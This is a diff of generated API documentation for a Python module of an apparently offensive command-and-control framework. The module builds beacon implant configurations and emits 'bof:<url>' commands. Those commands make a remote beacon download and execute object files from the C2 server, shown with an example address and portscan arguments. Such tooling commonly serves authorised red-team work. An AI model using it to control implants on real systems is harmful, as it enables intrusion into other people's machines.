@@ -1,6 +1,6 @@
 # `modules.beacon_config_builder`
 
-> Source: [modules/beacon_config_builder.py:1](../../modules/beacon_config_builder.py#L1) | language `py` | coverage 91.7% | [API index](../index.md)
+> Source: [modules/beacon_config_builder.py:1](../../modules/beacon_config_builder.py#L1) | language `py` | coverage 92.3% | [API index](../index.md)
 
 Beacon configuration builder — wires profile engines into beacon compile-time config.
 
@@ -33,7 +33,7 @@ Usage:
 ## Contents
 
 - **Classes:** [`BeaconConfig`](#beaconconfig), [`BeaconConfigBuilder`](#beaconconfigbuilder)
-- **Functions:** [`generate_bof_execution_command`](#generate_bof_execution_command)
+- **Functions:** [`sanitize_client_id`](#sanitize_client_id), [`generate_bof_execution_command`](#generate_bof_execution_command)
 
 ## Type Diagram
 
@@ -91,7 +91,7 @@ flowchart LR
 
 ### `BeaconConfig`
 
-`class` `dataclass` | [modules/beacon_config_builder.py:44](../../modules/beacon_config_builder.py#L44)
+`class` `dataclass` | [modules/beacon_config_builder.py:46](../../modules/beacon_config_builder.py#L46)
 
 Decorators: `@dataclass`
 
@@ -177,7 +177,7 @@ or template variables in the Go implant.
 
 #### `BeaconConfig.to_gen_beacon_args`
 
-`method` | [modules/beacon_config_builder.py:117](../../modules/beacon_config_builder.py#L117)
+`method` | [modules/beacon_config_builder.py:119](../../modules/beacon_config_builder.py#L119)
 
 ```python
 def to_gen_beacon_args(self) -> list[str]
@@ -191,7 +191,7 @@ Produce CLI arguments for gen_beacon.sh.
 
 #### `BeaconConfig.to_go_implant_vars`
 
-`method` | [modules/beacon_config_builder.py:137](../../modules/beacon_config_builder.py#L137)
+`method` | [modules/beacon_config_builder.py:139](../../modules/beacon_config_builder.py#L139)
 
 ```python
 def to_go_implant_vars(self) -> dict[str, Any]
@@ -205,7 +205,7 @@ Produce template variables for the Go implant builder.
 
 #### `BeaconConfig.to_config_json`
 
-`method` | [modules/beacon_config_builder.py:160](../../modules/beacon_config_builder.py#L160)
+`method` | [modules/beacon_config_builder.py:162](../../modules/beacon_config_builder.py#L162)
 
 ```python
 def to_config_json(self) -> dict[str, Any]
@@ -219,7 +219,7 @@ Produce the config.json that beacons fetch on startup.
 
 #### `BeaconConfig.to_dict`
 
-`method` | [modules/beacon_config_builder.py:185](../../modules/beacon_config_builder.py#L185)
+`method` | [modules/beacon_config_builder.py:187](../../modules/beacon_config_builder.py#L187)
 
 ```python
 def to_dict(self) -> dict[str, Any]
@@ -235,7 +235,7 @@ Full serialization of beacon config.
 
 ### `BeaconConfigBuilder`
 
-`class` | [modules/beacon_config_builder.py:237](../../modules/beacon_config_builder.py#L237)
+`class` | [modules/beacon_config_builder.py:239](../../modules/beacon_config_builder.py#L239)
 
 ```python
 class BeaconConfigBuilder
@@ -260,7 +260,7 @@ single BeaconConfig ready for beacon compilation.
 
 #### `BeaconConfigBuilder.__init__`
 
-`constructor` | [modules/beacon_config_builder.py:245](../../modules/beacon_config_builder.py#L245)
+`constructor` | [modules/beacon_config_builder.py:247](../../modules/beacon_config_builder.py#L247)
 
 ```python
 def __init__(self, payload: dict[str, Any]) -> None
@@ -276,7 +276,7 @@ def __init__(self, payload: dict[str, Any]) -> None
 
 #### `BeaconConfigBuilder.build`
 
-`method` | [modules/beacon_config_builder.py:248](../../modules/beacon_config_builder.py#L248)
+`method` | [modules/beacon_config_builder.py:250](../../modules/beacon_config_builder.py#L250)
 
 ```python
 def build(self, name: str | None = None) -> BeaconConfig
@@ -298,7 +298,7 @@ Build a complete BeaconConfig.
 
 #### `BeaconConfigBuilder.from_payload`
 
-`classmethod` | [modules/beacon_config_builder.py:403](../../modules/beacon_config_builder.py#L403)
+`classmethod` | [modules/beacon_config_builder.py:405](../../modules/beacon_config_builder.py#L405)
 
 Decorators: `@classmethod`
 
@@ -320,7 +320,7 @@ Build a BeaconConfigBuilder from a payload dictionary.
 
 #### `BeaconConfigBuilder.from_payload_file`
 
-`classmethod` | [modules/beacon_config_builder.py:408](../../modules/beacon_config_builder.py#L408)
+`classmethod` | [modules/beacon_config_builder.py:410](../../modules/beacon_config_builder.py#L410)
 
 Decorators: `@classmethod`
 
@@ -342,21 +342,55 @@ Build a BeaconConfigBuilder by loading payload.json from disk.
 
 ## Functions
 
+<a id="sanitize_client_id"></a>
+
+### `sanitize_client_id`
+
+`function` | [modules/beacon_config_builder.py:425](../../modules/beacon_config_builder.py#L425)
+
+```python
+def sanitize_client_id(client_id: str) -> str
+```
+
+Return a strict beacon client id safe for URLs and file paths.
+
+The beacon protocol identifies sessions with a client id that also
+becomes a file name on the C2; only alphanumerics, hyphen and
+underscore are allowed.
+
+**Parameters**
+
+| Name | Type | Default | Description |
+|---|---|---|---|
+| `client_id` | `str` |  | Raw operator-supplied beacon id. |
+
+**Returns:** `str` - The cleaned id.
+
+**Raises**
+
+- `ValueError`: When the id is empty or contains other characters.
+
+*Called by:* [`bof_results`](modules.bof_delivery.py.md#bof_results), [`queue_to_beacon`](modules.bof_delivery.py.md#queue_to_beacon), [`run_bof_train`](modules.bof_delivery.py.md#run_bof_train)
+
+---
+
 <a id="generate_bof_execution_command"></a>
 
 ### `generate_bof_execution_command`
 
-`function` | [modules/beacon_config_builder.py:416](../../modules/beacon_config_builder.py#L416)
+`function` | [modules/beacon_config_builder.py:449](../../modules/beacon_config_builder.py#L449)
 
 ```python
-def generate_bof_execution_command(bof_name: str, c2_url: str, client_id: str, args: list[str] | None = None, bofs_dir: str = 'bofs') -> str
+def generate_bof_execution_command(bof_name: str, c2_url: str, args: list[str] | None = None, bofs_dir: str = _BOFS_URL_SEGMENT) -> str
 ```
 
-Generate a ``bof:<url>`` command that the C beacon executes.
+Generate a ``bof:<url>[ <args>]`` command that a beacon executes.
 
-The C beacon downloads the BOF from the C2 endpoint and executes it
-via its internal COFFLoader. This function produces the exact command
-string the operator should issue to the C2 to deploy a BOF.
+Both beacon interpreters (the Windows COFFLoader beacon and the
+BlackSandBeacon ELF loader) parse the payload ``bof:`` prefix, then
+the URL, then a single space, then the argument string. Everything
+after the first space is passed verbatim to the BOF ``go`` entry
+point as the argument buffer, so arguments are joined with commas.
 
 **Parameters**
 
@@ -364,12 +398,16 @@ string the operator should issue to the C2 to deploy a BOF.
 |---|---|---|---|
 | `bof_name` | `str` |  | BOF catalog name (e.g., ``ldap_enum``). |
 | `c2_url` | `str` |  | C2 base URL (e.g., ``https://10.10.14.1:4444``). |
-| `client_id` | `str` |  | Target beacon client ID. |
-| `args` | `list[str] \| None` | `None` | Optional arguments to pass to the BOF. |
-| `bofs_dir` | `str` | `'bofs'` |  |
+| `args` | `list[str] \| None` | `None` | Optional arguments to pass to the BOF as one comma-joined string. |
+| `bofs_dir` | `str` | `_BOFS_URL_SEGMENT` | URL segment under ``/download/`` that serves the BOF. |
 
-**Returns:** `str` - A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``.
+**Returns:** `str` - A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``
+or ``bof:.../bofs/portscan 10.0.0.7,80,110`` when args are given.
 
-*Called by:* [`BofMarketplaceCommandSet.do_bof_run`](cli.commands.bof_registry.py.md#bofmarketplacecommandset-do_bof_run)
+**Raises**
+
+- `ValueError`: When ``bof_name``, ``bofs_dir`` or an arg contains characters that would break the ``bof:`` payload contract.
+
+*Called by:* [`delivery_command`](modules.bof_delivery.py.md#delivery_command)
 
 ---
